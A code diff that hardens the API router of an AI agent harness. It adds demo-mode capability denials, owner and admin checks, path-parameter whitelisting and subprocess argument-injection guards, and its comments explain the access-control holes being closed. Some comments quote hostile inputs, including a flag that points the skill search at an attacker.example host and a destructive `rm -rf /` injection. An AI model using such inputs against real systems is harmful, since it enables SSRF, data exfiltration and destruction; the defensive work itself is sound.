@@ -3,6 +3,7 @@ import asyncio
 import json
 import os
 import queue
+import re
 import secrets
 import threading
 import time
@@ -78,9 +79,17 @@ def _check_rate_limit(ip: str) -> bool:
                 del _rate_limit_store[k]
     return True
 
+# mp-login 是未接真实客户端的半成品（docstring 自认 code currently unused）：默认关。
+# 关时不注册路由（文件末尾条件注册）→ 任何人 404，且不进豁免名单：豁免=放行，
+# 与"端点根本不存在"是两件事，别让半成品以最高信任配置常驻。
+_MP_LOGIN_ENABLED = os.environ.get("HARNESS_ENABLE_MP_LOGIN", "").strip().lower() in ("1", "true", "yes")
+
 _AUTH_EXEMPT_PREFIXES = ("/health", "/metrics", "/admin")
 _AUTH_EXEMPT_EXACT = ("/", "/setup", "/dashboard")
-_AUTH_EXEMPT_V1 = ("/v1/auth/login", "/v1/auth/mp-login", "/v1/auth/refresh", "/v1/auth/setup-admin", "/v1/setup/config")
+_AUTH_EXEMPT_V1 = (
+    ("/v1/auth/login", "/v1/auth/refresh", "/v1/auth/setup-admin")
+    + (("/v1/auth/mp-login",) if _MP_LOGIN_ENABLED else ())
+)
 
 # ─── Token optimization: conversation window ───
 MAX_HISTORY_ROUNDS = int(os.environ.get("HARNESS_MAX_HISTORY", "8"))
@@ -367,16 +376,21 @@ async def chat_completions(req: ChatRequest, request: Request):
     if not last_user_msg:
         return JSONResponse({"error": "No user message found"}, status_code=400)
 
-    # ── Demo mode: no LLM backend → use CS agent fallback ──
+    # ── Demo mode: no LLM backend → use injected fallback ──
+    # 由 composition root（main.py）注入 cs_demo 的能力：**app 之间不互相 import**
+    # （ADR#9 rule2）。此前这里是 lazy `from apps.cs_demo... import run_cs_agent`，
+    # 人眼和 grep 都容易漏，是 AST 守卫抓出来的。
     from agent_harness.core.config import LLAMA_API, CLOUD_API_KEY
     if not LLAMA_API and not CLOUD_API_KEY:
-        from agent_harness.apps.cs_demo.agents.cs_agent import run_cs_agent
-        from agent_harness.apps.cs_demo.tools.customer_service import classify_cs_intent
-        result = run_cs_agent(last_user_msg)
+        if _demo_chat_fallback is None:
+            return JSONResponse(
+                {"error": "demo 回退未注册（应由 main.py 注入 cs_demo 能力）"}, status_code=503)
+        result = _demo_chat_fallback(last_user_msg)
         reply = result.get("reply", "")
-        intent = result.get("intent", classify_cs_intent(last_user_msg))
-        from agent_harness.apps.cs_demo.api import _get_cs_quick_replies
-        quick = _get_cs_quick_replies(intent)
+        # 注：本分支此前还会算 `intent` 与 `quick_replies` 却**全部丢弃**（而 cs_demo 自己的
+        # API 已发布 `quick_replies`、前端也有 `.quick-replies` 样式）。是否把它们加进本端点
+        # 响应属于**响应契约变更**，待 @user 拍板后单独提交，不混进本轮修复
+        # （同 query_decompose 的「契约 3 条 vs 实现 5 条」处置原则）。
         if req.stream:
             async def _demo_stream():
                 yield "data: " + json.dumps({"choices": [{"delta": {"role": "assistant", "content": reply}}]}) + "\n\n"
@@ -493,6 +507,16 @@ async def chat_completions(req: ChatRequest, request: Request):
     }
 
 
+# ─── Demo 回退注入点（composition root 调 set_demo_chat_fallback 注册）───
+_demo_chat_fallback = None
+
+
+def set_demo_chat_fallback(fn) -> None:
+    """由 main.py 注入 cs_demo 的 chat 能力（避免 research → cs_demo 的跨 app import）。"""
+    global _demo_chat_fallback
+    _demo_chat_fallback = fn
+
+
 # ─── Setup API ───
 
 def _get_cm():
@@ -502,12 +526,69 @@ def _get_cm():
 
 @router.get("/v1/setup/config")
 async def get_config():
-    return _get_cm().load_config()
+    cm = _get_cm()
+    return cm.redact_config(cm.load_config())
+
+
+# 公开 demo 下"访客自带 key"这条设计路径本身就是 RCE 链第一环（render.yaml 注释承认了该意图）：
+# 访客可写 llm.api_url → 服务器按访客的端点发 LLM 请求 → agent 工具链在部署主机上执行。
+# demo 的访客身份又是 role="admin"（main.py:115），所以**角色闸在这里没用**，只能按模式拒写。
+_DEMO_ALLOW_LLM_CONFIG = os.environ.get("HARNESS_DEMO_ALLOW_LLM_CONFIG", "").strip().lower() in ("1", "true", "yes")
+
+
+# ─── demo 能力表（ADR#11：按**后果语义**定义，不按端点枚举）───
+# 公开 demo（DISABLE_AUTH=1）的访客身份是 role="admin"（main.py:115），角色闸在 demo 下等于没闸。
+# 按端点逐个打补丁必漏（skills/marketplace/install、tools/{name}/toggle 都是这么被漏掉的），
+# 所以这里按"这个操作会造成什么后果"列能力，端点只做映射：
+#   write_server_config  改服务器配置（访客可控 llm.api_url + 完整工具链 = 在部署主机上执行代码）
+#   create_account       建持久账号（公网可自建管理员）
+#   global_toggle        全局开关（把工具/技能一个个关掉 = 持久 DoS）
+#   write_host_state     写宿主状态（技能/插件目录，跨产品边界）
+#   run_external_process 起外部进程（skillhub install …）
+#   export_all_data     一键导出**所有人的**数据（admin 身份 + `owner_filter=None`）
+_DEMO_DENIED_CAPS = {
+    "write_server_config",
+    "create_account",
+    "global_toggle",
+    "write_host_state",
+    "run_external_process",
+    # 导出三兄弟的 owner 过滤对 admin 失效（`owner_filter = None if is_admin`），
+    # 而 demo 访客即 admin → 任何访客能转储所有人的会话/报告。自托管保留一键导出。
+    "export_all_data",
+}
+
+# 旧开关名保留（已发布的止血开关，别让它的语义悄悄变）
+_LEGACY_CAP_ENV = {"write_server_config": "HARNESS_DEMO_ALLOW_LLM_CONFIG"}
+
+
+def _capability_denied(cap: str) -> bool:
+    """demo 下按能力拒绝。要放开某项必须显式设 `HARNESS_DEMO_ALLOW_<CAP>=1`（fail-closed）。"""
+    from agent_harness.core.config import DISABLE_AUTH
+    if not DISABLE_AUTH:
+        return False
+    names = [f"HARNESS_DEMO_ALLOW_{cap.upper()}"]
+    if cap in _LEGACY_CAP_ENV:
+        names.append(_LEGACY_CAP_ENV[cap])
+    for n in names:
+        if os.environ.get(n, "").strip().lower() in ("1", "true", "yes"):
+            return False
+    return cap in _DEMO_DENIED_CAPS
 
 
 @router.post("/v1/setup/config")
 async def save_config(request: Request):
+    if _capability_denied("write_server_config"):
+        return JSONResponse(
+            {"error": "演示模式禁止修改服务器配置（如需'访客自带 key'，需先给 agent 工具做能力门，"
+                      "再设 HARNESS_DEMO_ALLOW_WRITE_SERVER_CONFIG=1）"},
+            status_code=403,
+        )
     body = await request.json()
+    # scheme 白名单：只允许 http/https（`file://`、`javascript:` 之类不得进 LLM 客户端）
+    llm = (body or {}).get("llm") or {}
+    api_url = str(llm.get("api_url", "") or "").strip()
+    if api_url and not api_url.lower().startswith(("http://", "https://")):
+        return JSONResponse({"error": "llm.api_url 必须以 http:// 或 https:// 开头"}, status_code=400)
     return _get_cm().save_config(body)
 
 
@@ -546,6 +627,10 @@ async def run_fix(request: Request):
 
 @router.post("/v1/setup/auto-configure")
 async def auto_configure():
+    # 同 `/v1/setup/config`：这条也会 `save_config`（auto_setup.py:160），
+    # 是"访客改服务器配置"的第二条写路径 —— demo 下必须同样 fail-closed。
+    if _capability_denied("write_server_config"):
+        return JSONResponse({"error": "演示模式禁止修改服务器配置"}, status_code=403)
     result = _get_cm().fix_action("auto_configure")
     return result
 
@@ -560,6 +645,7 @@ async def list_tools():
             k: {
                 "description": v["schema"].get("description", ""),
                 "privilege": v.get("privilege", "read-only"),
+                "category": v.get("category", ""),
                 "properties": list(v["schema"].get("properties", {}).keys()),
                 "enabled": is_tool_enabled(k),
             }
@@ -572,14 +658,19 @@ async def list_tools():
 
 # ─── Path traversal sanitizer ───
 
+# 白名单：路径参数只允许 Unicode 词字符（字母/数字/下划线，含中日韩）+ 连字符。
+# 关键：不能用 ASCII 白名单 —— `_slugify` 用的是 `\w`（Unicode），中文标题会留在
+# 真实 id 里（例：`formal_1783488609_智能手表竞品分析报告`），ASCII 白名单会把每份
+# 中文标题报告打成 400。`[\w-]` 天然排除 `* ? [ ] / \ .` 等 glob/路径元字符（黑名单
+# 只挡 `..` 与斜杠，实测 `*` `?` `[` 全放行 → 前缀通配可读他人报告 + 命中目录后 500）。
+_PATH_PARAM_RE = re.compile(r"^[\w-]{1,128}$", re.UNICODE)
+
+
 def _safe_path_param(value: str) -> str:
-    if not value or value.strip() in ("", ".", ".."):
-        raise ValueError("Invalid path parameter: empty or dot")
-    if ".." in value:
-        raise ValueError("Path traversal detected: '..' not allowed")
-    if "/" in value or "\\" in value:
-        raise ValueError("Path traversal detected: slashes not allowed")
-    return value.strip()
+    v = (value or "").strip()
+    if not _PATH_PARAM_RE.match(v):
+        raise ValueError("Invalid path parameter: only [A-Za-z0-9_-]{1,128} allowed")
+    return v
 
 
 # ─── Report API ───
@@ -604,56 +695,58 @@ async def create_report(request: Request):
 
 
 @router.get("/v1/reports")
-async def list_reports(request: Request, limit: int = 50, offset: int = 0):
+async def list_reports(request: Request,
+                       limit: int = Query(50, ge=1, le=500),
+                       offset: int = Query(0, ge=0),
+                       q: str = ""):
+    """集合读取 + 搜索（REST 集合过滤）：唯一读路径 = store.list_reports(q=...)。"""
     user = getattr(request.state, "user", None)
-    is_admin = user and user.get("role") == "admin"
-    owner_filter = None if is_admin else (user.get("id", "") if user else "")
-    reports = _get_rs().list_reports(limit=limit, offset=offset, owner_id=owner_filter)
+    is_admin = bool(user and user.get("role") == "admin")
+    owner_filter = None if is_admin else ((user or {}).get("id", ""))
+    reports = _get_rs().list_reports(
+        limit=limit, offset=offset, owner_id=owner_filter, q=q or None,
+    )
     return {"reports": reports, "count": len(reports)}
 
 
 @router.get("/v1/reports/{report_id}")
-async def get_report(report_id: str):
-    from agent_harness.apps.research.pipeline.report_store import REPORTS_DIR as _RD
+async def get_report(report_id: str, request: Request):
+    """单份报告：所有权由 store 强制（owner_id 必传）。
+
+    旧实现不接 request、拿不到身份，且用 `_RD.glob(f"{report_id}*")` 前缀多匹配
+    直接读文件系统 → 非 owner 可读任意报告（前缀通配即可 dump）。现一律经
+    store.get_report(owner_id=...)，非 owner 与不存在都回 404（不泄露存在性）。
+    """
     try:
-        _safe_path_param(report_id)
+        report_id = _safe_path_param(report_id)
     except ValueError as e:
         return JSONResponse({"error": str(e)}, status_code=400)
-    for ext in [".html", ".md"]:
-        path = _RD / (f"{report_id}{ext}")
-        if path.exists():
-            content = path.read_text(encoding="utf-8")
-            if ext == ".html":
-                return HTMLResponse(content)
-            return {"id": report_id, "content": content, "format": "md"}
-        for f in _RD.glob(f"{report_id}*"):
-            content = f.read_text(encoding="utf-8")
-            if f.suffix == ".html":
-                return HTMLResponse(content)
-            return {"id": report_id, "content": content, "format": "md"}
-    return JSONResponse({"error": "Report not found"}, status_code=404)
+    user = getattr(request.state, "user", None)
+    is_admin = bool(user and user.get("role") == "admin")
+    owner_filter = None if is_admin else ((user or {}).get("id", ""))
+    data = _get_rs().get_report(report_id, owner_id=owner_filter)
+    if data is None:
+        return JSONResponse({"error": "Report not found"}, status_code=404)
+    content = data.get("content", "")
+    if data.get("format") == "html" or str(data.get("filename", "")).endswith(".html"):
+        return HTMLResponse(content)
+    return {"id": data.get("id", report_id), "content": content, "format": "md",
+            "title": data.get("title", ""), "created_at": data.get("created_at")}
 
 
 @router.delete("/v1/reports/{report_id}")
-async def delete_report(report_id: str):
+async def delete_report(report_id: str, request: Request):
     try:
-        _safe_path_param(report_id)
+        report_id = _safe_path_param(report_id)
     except ValueError as e:
         return JSONResponse({"error": str(e)}, status_code=400)
-    if _get_rs().delete_report(report_id):
-        return {"status": "deleted"}
-    return JSONResponse({"error": "Report not found"}, status_code=404)
-
-
-@router.get("/v1/reports/search")
-async def search_reports(request: Request, q: str = ""):
-    if not q:
-        return {"reports": []}
     user = getattr(request.state, "user", None)
-    is_admin = user and user.get("role") == "admin"
-    owner_filter = None if is_admin else (user.get("id", "") if user else "")
-    reports = _get_rs().search_reports(q, owner_id=owner_filter)
-    return {"reports": reports, "count": len(reports)}
+    is_admin = bool(user and user.get("role") == "admin")
+    owner_filter = None if is_admin else ((user or {}).get("id", ""))
+    if _get_rs().delete_report(report_id, owner_id=owner_filter):
+        return {"status": "deleted"}
+    # 非 owner 与不存在同回 404：删除不得成为存在性 oracle
+    return JSONResponse({"error": "Report not found"}, status_code=404)
 
 
 @router.post("/v1/reports/formalize")
@@ -682,10 +775,20 @@ async def formalize_report(request: Request):
 
 @router.get("/v1/audit/logs")
 async def get_audit_logs(
+    request: Request,
     action: str = "",
     limit: int = Query(50, ge=1, le=500),
 ):
-    """查询审计日志"""
+    """查询审计日志 —— **仅管理员**。
+
+    审计行含 `params` / `result`（每次工具调用的**实参与输出**：用户 prompt、被执行的代码、
+    文件路径、查询串…），而 `audit_log` 表**没有 owner 列**，做不到"只看自己的" →
+    多用户部署下，任何已登录用户都能读到别人的工具调用明细（跨用户信息泄漏）。
+    故这里只有 admin 能读；前端目前不调用本端点（grep 零命中），加闸零 UI 回归。
+    """
+    user = getattr(request.state, "user", None)
+    if not user or user.get("role") != "admin":
+        return JSONResponse({"error": "需要管理员权限"}, status_code=403)
     from agent_harness.core.audit import query_audit
     logs = query_audit(action=action, limit=limit)
     return {"logs": logs, "count": len(logs)}
@@ -757,11 +860,13 @@ async def delete_session_endpoint(session_id: str, request: Request):
 
 
 @router.get("/v1/sessions/{session_id}/messages")
-async def get_session_messages(session_id: str):
+async def get_session_messages(request: Request, session_id: str):
     try:
         _safe_path_param(session_id)
     except ValueError as e:
         return JSONResponse({"error": str(e)}, status_code=400)
+    if _session_access_denied(request, session_id):
+        return JSONResponse({"error": "Session not found"}, status_code=404)
     msgs = _load_session(session_id)
     if msgs is None:
         return JSONResponse({"error": "Session not found"}, status_code=404)
@@ -790,11 +895,13 @@ async def update_session_meta_endpoint(session_id: str, request: Request):
 
 
 @router.get("/v1/sessions/{session_id}/export")
-async def export_single_session(session_id: str):
+async def export_single_session(request: Request, session_id: str):
     try:
         _safe_path_param(session_id)
     except ValueError as e:
         return JSONResponse({"error": str(e)}, status_code=400)
+    if _session_access_denied(request, session_id):
+        return JSONResponse({"error": "Session not found"}, status_code=404)
     msgs = _load_session(session_id) or []
     data = {"session_id": session_id, "messages": msgs, "exported_at": int(time.time())}
     return StreamingResponse(
@@ -816,24 +923,42 @@ async def search_messages(request: Request, q: str = ""):
     return {"results": results, "count": len(results)}
 
 
+def _session_access_denied(request: Request, session_id: str) -> bool:
+    """单条会话的 owner 校验：非 owner 与"不存在"同回 404（不得成为存在性 oracle）。
+
+    admin 不受限；legacy 无 owner 的会话对非 admin 不可见（与 reports 同一策略）。
+    """
+    user = getattr(request.state, "user", None) or {}
+    if user.get("role") == "admin":
+        return False
+    from agent_harness.core.pipeline.session_store import get_session_summary
+    meta = get_session_summary(session_id) or {}
+    owner = meta.get("owner_id", "")
+    return not (owner and owner == user.get("id", ""))
+
+
 # ─── Agent Log API ───
 
 @router.get("/v1/sessions/{session_id}/logs")
-async def get_session_logs(session_id: str):
+async def get_session_logs(request: Request, session_id: str):
     try:
         _safe_path_param(session_id)
     except ValueError as e:
         return JSONResponse({"error": str(e)}, status_code=400)
+    if _session_access_denied(request, session_id):
+        return JSONResponse({"error": "Session not found"}, status_code=404)
     logs = _get_logs(session_id)
     return {"logs": logs, "count": len(logs)}
 
 
 @router.delete("/v1/sessions/{session_id}/logs")
-async def clear_session_logs(session_id: str):
+async def clear_session_logs(request: Request, session_id: str):
     try:
         _safe_path_param(session_id)
     except ValueError as e:
         return JSONResponse({"error": str(e)}, status_code=400)
+    if _session_access_denied(request, session_id):
+        return JSONResponse({"error": "Session not found"}, status_code=404)
     if _clear_logs(session_id):
         return {"status": "cleared"}
     return {"status": "not_found"}
@@ -950,7 +1075,7 @@ async def kb_query(q: str = "", collection: str = "default", top_k: int = 5):
 
 # ─── Auth API ───
 
-@router.post("/v1/auth/mp-login")
+# 路由注册在文件末尾按 _MP_LOGIN_ENABLED 条件执行（默认关 → 端点不存在 → 404）。
 async def mp_login(request: Request):
     """Mini Program auto-login. Creates user on first visit.
 
@@ -961,14 +1086,36 @@ async def mp_login(request: Request):
     device_id = (body.get("device_id", "") or "").strip()
     if not device_id:
         return JSONResponse({"error": "device_id required"}, status_code=400)
+    if len(device_id) < 2 or len(device_id) > 48 or any(
+        not (c.isalnum() or c == "_") for c in device_id
+    ):
+        return JSONResponse(
+            {"error": "device_id 只能包含字母、数字和下划线，长度 2-48"},
+            status_code=400,
+        )
 
-    # Check if user exists by device_id (stored as username)
-    user = _auth_db.get_user_by_username(device_id)
+    # P0 修复——命名空间隔离：设备账号一律存/查在 DEVICE_USERNAME_PREFIX 前缀下。
+    # 旧实现直接按裸 device_id 查 users 表，device_id 命中已存在密码账号(如 admin)时
+    # 无条件按该用户自己的 role 铸 token = 凭一个可枚举字符串免密登录任意账号。
+    mp_username = _auth_db.DEVICE_USERNAME_PREFIX + device_id
+    user = _auth_db.get_user_by_username(mp_username)
     is_new = False
     if not user:
-        _auth_db.create_user(device_id, secrets.token_hex(16), role="user", display_name=device_id[:12])
-        user = _auth_db.get_user_by_username(device_id)
-        is_new = True
+        try:
+            _auth_db.create_user(
+                mp_username, secrets.token_hex(16),
+                role="user", display_name=device_id[:12], is_device=True,
+            )
+        except ValueError:
+            # 并发首次登录竞态：另一请求刚建好，重读复用
+            user = _auth_db.get_user_by_username(mp_username)
+        else:
+            user = _auth_db.get_user_by_username(mp_username)
+            is_new = True
+
+    # 纵深防御：设备命名空间内不允许 admin；异常/被篡改数据一律拒发 token
+    if user is None or user.get("role") != "user":
+        return JSONResponse({"error": "设备登录不可用"}, status_code=403)
 
     access_token = _auth_jwt.create_access_token(user["id"], device_id[:8], user["role"])
     refresh_token = _auth_jwt.create_refresh_token(user["id"], device_id[:8], user["role"])
@@ -984,6 +1131,10 @@ async def mp_login(request: Request):
         "is_new": is_new,
         "username": device_id[:8],
     }
+
+
+if _MP_LOGIN_ENABLED:  # 默认关：未部署的半成品端点是纯粹攻击面
+    router.add_api_route("/v1/auth/mp-login", mp_login, methods=["POST"])
 
 
 @router.get("/v1/auth/login")
@@ -1083,6 +1234,9 @@ async def get_api_token(request: Request):
 
 @router.post("/v1/auth/reset")
 async def regenerate_api_token(request: Request):
+    user = getattr(request.state, "user", None)
+    if not user or user.get("role") != "admin":
+        return JSONResponse({"error": "需要管理员权限"}, status_code=403)
     global _API_TOKEN
     _API_TOKEN = _reset_token()
     return {"status": "regenerated", "warning": "所有使用旧 token 的客户端需要更新"}
@@ -1101,6 +1255,8 @@ async def admin_list_users(request: Request):
 
 @router.post("/v1/admin/users")
 async def admin_create_user(request: Request):
+    if _capability_denied("create_account"):
+        return JSONResponse({"error": "演示模式禁止创建账号"}, status_code=403)
     user = getattr(request.state, "user", None)
     if not user or user.get("role") != "admin":
         return JSONResponse({"error": "需要管理员权限"}, status_code=403)
@@ -1181,7 +1337,9 @@ async def list_skills():
 
 
 @router.post("/v1/skills/{name}/toggle")
-async def toggle_skill(name: str):
+async def toggle_skill(request: Request, name: str):
+    if _capability_denied("write_host_state"):
+        return JSONResponse({"error": "演示模式禁止修改宿主技能库"}, status_code=403)
     enabled_dir = _HERMES_SKILLS_DIR / name
     disabled_dir = _HERMES_SKILLS_DIR / "_disabled" / name
     if enabled_dir.exists():
@@ -1197,12 +1355,22 @@ async def toggle_skill(name: str):
 
 @router.get("/v1/skills/marketplace")
 async def marketplace_search(q: str = ""):
+    # 能力闸：与 marketplace_install 同形 —— 搜索同样要起外部进程（skillhub）
+    if _capability_denied("run_external_process"):
+        return JSONResponse({"error": "演示模式禁止调用第三方技能市场"}, status_code=403)
+    q = (q or "").strip()
+    # 参数注入防护：q 直通外部程序 → flag 注入。`?q=--search-url=http://attacker.example/api`
+    # 会让**部署主机替访客出网**（SSRF / 查询内容外带），`;rm -rf /` 之类更是直给。
+    if q and (q.startswith("-") or not re.fullmatch(r"[A-Za-z0-9][A-Za-z0-9._-]{0,63}", q)):
+        return JSONResponse(
+            {"error": "查询非法（只允许字母数字与 . _ -，且不得以 - 开头）"}, status_code=400)
     import shutil, subprocess
     skillhub = shutil.which("skillhub") or os.path.expanduser("~/.local/bin/skillhub")
     if not os.path.isfile(skillhub):
         return {"skills": [], "error": "SkillHub not installed"}
     try:
-        r = subprocess.run([skillhub, "search", q] if q else [skillhub, "search", ""], capture_output=True, text=True, timeout=15)
+        # `--` 明确结束选项解析：即使上游校验被绕过，q 也不会再被当作 flag
+        r = subprocess.run([skillhub, "search", "--", q], capture_output=True, text=True, timeout=15)
         lines = [line.strip() for line in r.stdout.split("\n") if line.strip() and not line.startswith("NAME")]
         skills = []
         for line in lines[:50]:
@@ -1221,20 +1389,31 @@ async def marketplace_search(q: str = ""):
 @router.post("/v1/skills/marketplace/install")
 async def marketplace_install(request: Request):
     body = await request.json()
+    if _capability_denied("run_external_process"):
+        return JSONResponse({"error": "演示模式禁止安装第三方技能"}, status_code=403)
     slug = (body.get("slug", "") or "").strip()
     if not slug:
         return JSONResponse({"error": "缺少 slug 参数"}, status_code=400)
+    # 参数注入防护（list 形式挡 shell 注入，挡不住 flag 注入：`--target=/x` 会被当参数解析）
+    if slug.startswith("-") or not re.fullmatch(r"[A-Za-z0-9][A-Za-z0-9._-]{0,63}", slug):
+        return JSONResponse({"error": "slug 非法（只允许字母数字与 . _ -，且不得以 - 开头）"}, status_code=400)
     import shutil, subprocess
     skillhub = shutil.which("skillhub") or os.path.expanduser("~/.local/bin/skillhub")
     if not os.path.isfile(skillhub):
         return JSONResponse({"error": "SkillHub 未安装"}, status_code=400)
     try:
-        r = subprocess.run([skillhub, "install", slug], capture_output=True, text=True, timeout=60)
+        # `--` 明确结束选项解析：即使上游校验被绕过，也不再把 slug 当 flag
+        r = subprocess.run([skillhub, "install", "--", slug], capture_output=True, text=True, timeout=60)
         if r.returncode != 0:
             return JSONResponse({"error": "安装失败: %s" % (r.stderr or r.stdout)}, status_code=400)
         return {"status": "installed", "name": slug}
     except subprocess.TimeoutExpired:
         return JSONResponse({"error": "安装超时"}, status_code=504)
+    except OSError as e:
+        # `os.path.isfile` 挡不住"存在但不可执行"（Windows 上 ~/.local/bin/skillhub 就是这种）：
+        # 此前只捕 TimeoutExpired → 其它 OSError 直接冒成 500（未捕获路径）。
+        return JSONResponse(
+            {"error": f"SkillHub 无法执行（{type(e).__name__}）：检查它是否为可执行文件"}, status_code=400)
 
 
 # ─── Tools Config API ───
@@ -1250,6 +1429,7 @@ async def get_tool_detail(name: str):
             "name": name,
             "description": entry["schema"].get("description", ""),
             "privilege": entry.get("privilege", "read-only"),
+            "category": entry.get("category", ""),
             "properties": list(entry["schema"].get("properties", {}).keys()),
             "enabled": is_tool_enabled(name),
         }
@@ -1258,7 +1438,9 @@ async def get_tool_detail(name: str):
 
 
 @router.post("/v1/tools/{name}/toggle")
-async def toggle_tool_endpoint(name: str):
+async def toggle_tool_endpoint(request: Request, name: str):
+    if _capability_denied("global_toggle"):
+        return JSONResponse({"error": "演示模式禁止修改全局工具开关"}, status_code=403)
     try:
         new_state = _toggle_tool(name)
         return {"name": name, "enabled": new_state}
@@ -1291,8 +1473,13 @@ import zipfile
 
 
 @router.get("/v1/export/sessions")
-async def export_sessions():
-    sessions = _list_sessions()
+async def export_sessions(request: Request):
+    if _capability_denied("export_all_data"):
+        return JSONResponse({"error": "演示模式禁止导出全部数据（自托管不受影响）"}, status_code=403)
+    user = getattr(request.state, "user", None)
+    is_admin = user and user.get("role") == "admin"
+    owner_filter = None if is_admin else (user.get("id", "") if user else "")
+    sessions = _list_sessions(owner_id=owner_filter)
     data = []
     for s in sessions:
         msgs = _load_session(s["id"])
@@ -1306,15 +1493,20 @@ async def export_sessions():
 
 
 @router.get("/v1/export/reports")
-async def export_reports():
-    from agent_harness.apps.research.pipeline.report_store import REPORTS_DIR as _RD
-    from agent_harness.apps.research.pipeline.report_store import _load_index
-    index = _load_index()
+async def export_reports(request: Request):
+    if _capability_denied("export_all_data"):
+        return JSONResponse({"error": "演示模式禁止导出全部数据（自托管不受影响）"}, status_code=403)
+    user = getattr(request.state, "user", None)
+    is_admin = bool(user and user.get("role") == "admin")
+    owner_filter = None if is_admin else ((user or {}).get("id", ""))
+    # 经 store 读取并带 owner 过滤。旧实现算出了 owner_filter 却从未使用，
+    # 非 admin 导出到了全量报告（含他人）。
+    rs = _get_rs()
+    metas = rs.list_reports(limit=10 ** 6, offset=0, owner_id=owner_filter)
     data = []
-    for meta in index:
-        fp = _RD / meta.get("filename", "")
-        content = fp.read_text("utf-8") if fp.exists() else ""
-        data.append({**meta, "content": content})
+    for meta in metas:
+        full = rs.get_report(meta.get("id", ""), owner_id=owner_filter) or {}
+        data.append({**meta, "content": full.get("content", "")})
     return StreamingResponse(
         iter([json.dumps(data, ensure_ascii=False, indent=2)]),
         media_type="application/json",
@@ -1323,7 +1515,12 @@ async def export_reports():
 
 
 @router.get("/v1/export/backup")
-async def export_backup():
+async def export_backup(request: Request):
+    if _capability_denied("export_all_data"):
+        return JSONResponse({"error": "演示模式禁止导出全部数据（自托管不受影响）"}, status_code=403)
+    user = getattr(request.state, "user", None)
+    if not user or user.get("role") != "admin":
+        return JSONResponse({"error": "需要管理员权限"}, status_code=403)
     buf = io.BytesIO()
     with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
         sessions = _list_sessions()
@@ -1342,9 +1539,8 @@ async def export_backup():
             content = fp.read_text("utf-8") if fp.exists() else ""
             reports_data.append({**meta, "content": content})
         zf.writestr("reports.json", json.dumps(reports_data, ensure_ascii=False, indent=2))
-        db_path = _auth_db.DB_PATH
-        if db_path.exists():
-            zf.write(str(db_path), "auth.db")
+        # auth.db（全部账号密码哈希）不进备份包：备份端口导出的是数据，
+        # 不是凭据库。此前 role=user 一个 GET 就能把它连同全部会话一起拖走。
     buf.seek(0)
     return StreamingResponse(
         iter([buf.getvalue()]),
@@ -1356,12 +1552,18 @@ async def export_backup():
 # ─── Scheduler (CRON) API ───
 
 @router.get("/v1/scheduler/tasks")
-async def scheduler_list_tasks():
+async def scheduler_list_tasks(request: Request):
+    user = getattr(request.state, "user", None)
+    if not user or user.get("role") != "admin":
+        return JSONResponse({"error": "需要管理员权限"}, status_code=403)
     return {"tasks": _cron_list(), "count": len(_cron_list())}
 
 
 @router.post("/v1/scheduler/tasks")
 async def scheduler_create_task(request: Request):
+    user = getattr(request.state, "user", None)
+    if not user or user.get("role") != "admin":
+        return JSONResponse({"error": "需要管理员权限"}, status_code=403)
     body = await request.json()
     task_id = (body.get("id", "") or "").strip()
     schedule = (body.get("schedule", "") or "").strip()
@@ -1376,7 +1578,10 @@ async def scheduler_create_task(request: Request):
 
 
 @router.get("/v1/scheduler/tasks/{task_id}")
-async def scheduler_get_task(task_id: str):
+async def scheduler_get_task(task_id: str, request: Request):
+    user = getattr(request.state, "user", None)
+    if not user or user.get("role") != "admin":
+        return JSONResponse({"error": "需要管理员权限"}, status_code=403)
     task = _cron_get(task_id)
     if task is None:
         return JSONResponse({"error": "任务不存在"}, status_code=404)
@@ -1385,6 +1590,9 @@ async def scheduler_get_task(task_id: str):
 
 @router.post("/v1/scheduler/tasks/{task_id}")
 async def scheduler_update_task(task_id: str, request: Request):
+    user = getattr(request.state, "user", None)
+    if not user or user.get("role") != "admin":
+        return JSONResponse({"error": "需要管理员权限"}, status_code=403)
     body = await request.json()
     try:
         task = _cron_update(task_id, **body)
@@ -1396,7 +1604,10 @@ async def scheduler_update_task(task_id: str, request: Request):
 
 
 @router.delete("/v1/scheduler/tasks/{task_id}")
-async def scheduler_delete_task(task_id: str):
+async def scheduler_delete_task(task_id: str, request: Request):
+    user = getattr(request.state, "user", None)
+    if not user or user.get("role") != "admin":
+        return JSONResponse({"error": "需要管理员权限"}, status_code=403)
     if _cron_delete(task_id):
         return {"status": "deleted"}
     return JSONResponse({"error": "任务不存在"}, status_code=404)
@@ -1426,6 +1637,8 @@ async def kb_import_memory(request: Request):
 @router.post("/v1/skills/generate")
 async def skill_generate(request: Request):
     """对话式 Skill 生成器 — NL 描述 → Skill.md → 安装"""
+    if _capability_denied("write_host_state"):
+        return JSONResponse({"error": "演示模式禁止生成并安装技能"}, status_code=403)
     body = await request.json()
     description = (body or {}).get("description", "").strip()
     name = (body or {}).get("name", "").strip() or None
